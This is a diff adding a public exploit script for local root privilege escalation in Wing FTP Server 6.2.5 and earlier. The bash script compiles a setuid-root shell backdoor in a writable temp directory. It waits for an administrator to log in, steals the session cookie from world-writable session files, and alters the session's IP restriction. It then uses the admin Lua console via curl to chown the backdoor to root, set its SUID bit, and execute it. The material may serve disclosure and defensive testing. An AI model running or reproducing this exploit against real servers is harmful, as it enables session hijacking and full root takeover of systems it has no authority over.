@@ -1,0 +1,99 @@
+# Exploit Title: Wing FTP Server 6.2.5 - Privilege Escalation
+# Google Dork: intitle:"Wing FTP Server - Web"
+# Date: 2020-03-03
+# Exploit Author: Cary Hooper
+# Vendor Homepage: https://www.wftpserver.com
+# Software Link: https://www.wftpserver.com/download/wftpserver-linux-64bit.tar.gz
+# Version: v6.2.5 and prior
+# Tested on: Ubuntu 18.04
+# CVE: N/A
+
+# If $_WINGFTPDIR is the installation directory where Wing FTP was installed,
+# $_WINGFTPDIR/wftpserver/session/* --> corresponds to user sessions... world readable/writeable (possibly exploitable)
+# $_WINGFTPDIR/wftpserver/session_admin/* --> corresponds to admin sessions... world readable/writeable.
+# We can wait for an admin to log in, steal their session, then launch a curl command which executes LUA.
+# https://www.hooperlabs.xyz/disclosures/cve-2020-9470.php (writeup)
+
+
+
+#!/bin/bash
+
+echo 'Local root privilege escalation for Wing FTP Server (v.6.2.5)'
+echo 'Exploit by Cary Hooper (@nopantrootdance)'
+
+function writeBackdoor() {
+	#this function creates a backdoor program (executes bash)
+	echo "    Writing backdoor in $1"
+	echo '#include <stdio.h>' > $1/foobarh00p.c
+	echo '#include <sys/types.h>' >> $1/foobarh00p.c
+	echo '#include <unistd.h>' >> $1/foobarh00p.c
+	echo 'int main(void){setuid(0); setgid(0); system("/bin/bash");}' >> $1/foobarh00p.c
+	gcc -w $1/foobarh00p.c -o $1/foobarh00p
+}
+
+function makeRequest() {
+	#Executes Lua command in admin panel to set the suid bit/chown on our backdoor
+	#Change owner to root
+	curl -i -k -b "UIDADMIN=$1" --data "command=io.popen('chown%20root%20$2%2Ffoobarh00p')" 'http://127.0.0.1:5466/admin_lua_script.html?r=0.08732964480139693' -H "Referer: http://127.0.0.1:5466/admin_lua_term.html"  >/dev/null 2>/dev/null
+	#Make SUID
+	curl -i -k -b "UIDADMIN=$1" --data "command=io.popen('chmod%204777%20$2%2Ffoobarh00p')" 'http://127.0.0.1:5466/admin_lua_script.html?r=0.08732964480139693' -H "Referer: http://127.0.0.1:5466/admin_lua_term.html"  >/dev/null 2>/dev/null
+}
+
+directories=( "/tmp" "/var/tmp" "/dev/shm" )
+for dir in "${directories[@]}"
+do
+	#Check if directories are writeable
+	if [ -w $dir ]
+	then 
+		echo "[!] Writeable directory found: $dir"
+		export backdoordir=$dir
+		break
+	else 
+		echo "    $dir is not writeable..."; fi
+done
+
+writeBackdoor $backdoordir
+
+#Look for directory where administrative sessions are handled ($_WINGFTPDIR/session_admin/).
+echo "    Finding the wftpserver directory"
+export sessiondir=$(find / -name session_admin -type d 2>/dev/null | grep --color=never wftpserver)
+if [ -z "$sessiondir" ]; then echo "Wing FTP directory not found.  Consider looking manually."; exit 1; fi
+#Note: if no directory is found, look manually for the "wftpserver" directory, or a "wftpserver" binary.  Change the variable below and comment out the code above.  
+#export sessiondir="/opt/wftpserver/session_admin"
+
+#While loop to wait for an admin session to be established.  
+echo "    Waiting for a Wing FTP admin to log in.  This may take a while..."
+count=0
+while : ; do
+	if [ "$(ls -A $sessiondir)" ]; then
+		#If a session file exists, the UID_ADMIN cookie is the name of the file.
+		echo "[!] An administrator logged in... stealing their session."
+		export cookie=$(ls -A $sessiondir | cut -d '.' -f1)
+		export ip=$(cat $sessiondir/$cookie.lua | grep ipaddress| cut -d '[' -f4 | cut -d ']' -f1)
+		echo "    Changing IP restrictions on the cookie..."
+		cat $sessiondir/$cookie.lua | sed "s/$ip/127.0.0.1/g" > $backdoordir/$cookie.lua
+		cp $backdoordir/$cookie.lua $sessiondir/$cookie.lua
+		rm $backdoordir/$cookie.lua
+		echo "[!] Successfully stole session."
+		#Once found, make the malicious curl request
+		export urldir=$(sed "s/\//\%2F/g" <<<$backdoordir)
+		echo "    Making evil request as Wing FTP admin... (backdoor in ${backdoordir})"
+		makeRequest $cookie $urldir
+		break
+	else
+		#Checks every 10 seconds.  Outputs date to terminal for user feedback purposes only.
+		sleep 10
+		let "count+=1"
+		if [ $count -eq 10 ]; then date; fi
+		echo "..."
+	fi
+done
+
+#Check if backdoor was created correctly
+if [ $(stat -c "%a" $backdoordir/foobarh00p) != "4777" ]; then echo "    Something went wrong.  Backdoor is not SUID"; exit 1; fi
+if [ $(stat -c "%U" $backdoordir/foobarh00p) != "root" ]; then echo "    Something went wrong.  Backdoor is not owned by root"; exit 1; fi
+
+echo "    Backdoor is now SUID owned by root."
+echo "[!] Executing backdoor. Cross your fingers..."
+#Execute the backdoor... root!
+$backdoordir/foobarh00p
